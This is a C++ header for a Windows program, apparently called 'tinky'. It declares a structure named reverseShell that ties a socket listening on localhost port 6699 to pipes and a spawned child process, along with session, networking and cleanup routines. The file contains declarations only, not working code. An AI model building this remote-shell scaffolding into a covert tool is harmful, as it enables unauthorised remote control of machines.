#pragma once

#include <ws2tcpip.h>
#include <iostream>
#include <windows.h>

#define HOSTNAME "localhost"
#define PORT "6699"

#define BUFFER_SIZE 4096

#define PROCESS_STOP "Global\\stop_tinky_processes"

#define FAILURE 0
#define SUCCESS 1
#define CONNECTION_CLOSED 0

typedef enum {
	WAITING_FOR_CLIENT,
	FATAL_ERROR,
	RESET_SESSION,
	CONTINUE_SESSION
}	currentState_e;

typedef struct reverseShell {
	// socket {
	addrinfo	addrHints;
	addrinfo	*addrResult;

	SOCKET		listenSocket;
	SOCKET		clientSocket;
	// }

	// pipe {
	HANDLE					childRead ;
	HANDLE					parentWrite;

	HANDLE					childWrite;
	HANDLE					parentRead;

	SECURITY_ATTRIBUTES		secAttributes;
	// }

	// childProcess {
	STARTUPINFOW			startupInfo;
	PROCESS_INFORMATION		processInfo;
	// }

	HANDLE					stopEventsignal;

	// buffers {
	char	shellBuffer[BUFFER_SIZE];
	char	clientBuffer[BUFFER_SIZE];
	// }

}	reverseShell_t;

// =============== utils ===============
void journalReport(std::wstring msg);
void setSocketNonBlock(SOCKET *sock);
// =============================================

// =============== networking.cpp ===============
BYTE initNetworking(void);
// =============================================

// =============== cleanUp.cpp ===============
void cleanUp();
// =============================================

// =============== routine.cpp ===============
void run(void);
// =============================================

// =============== newSession.cpp ===============
currentState_e newSession(void);
// =============================================